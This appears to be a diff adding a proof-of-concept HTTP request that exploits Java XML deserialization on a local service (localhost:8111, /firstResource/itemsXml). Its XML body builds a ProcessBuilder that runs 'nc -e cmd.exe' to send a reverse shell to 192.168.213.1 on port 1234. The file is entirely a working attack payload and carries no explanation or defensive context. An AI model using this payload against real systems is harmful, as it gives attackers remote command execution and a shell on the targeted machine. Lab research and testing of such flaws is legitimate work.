@@ -1,0 +1,24 @@
+http://localhost.:8111/firstResource/itemsXml
+
+Content-Type: application/x-java-serialized-object+xml
+Host: localhost.:8111
+Content-Length: 378
+Expect: 100-continue
+Connection: Keep-Alive
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<java>
+
+	<object class="java.lang.ProcessBuilder">
+		<array class="java.lang.String" length="2" >
+			<void index="0"> 
+				<string>cmd.exe</string>								
+			</void>		
+			<void index="1"> 
+				<string>/c nc -e cmd.exe 192.168.213.1 1234</string>									
+			</void>		
+		</array>		
+		<void method="start"/>
+	</object> 	
+</java>	
